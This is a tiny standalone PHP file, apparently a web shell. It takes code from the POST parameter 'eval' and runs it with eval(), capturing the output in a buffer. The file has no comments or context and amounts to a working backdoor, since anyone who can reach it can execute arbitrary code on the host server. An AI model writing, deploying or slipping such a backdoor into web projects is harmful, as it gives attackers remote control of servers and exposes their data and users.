<?php
$eval = $_POST['eval'];
ob_clean();
eval($eval);
$ret = ob_get_contents();
ob_clean();
?>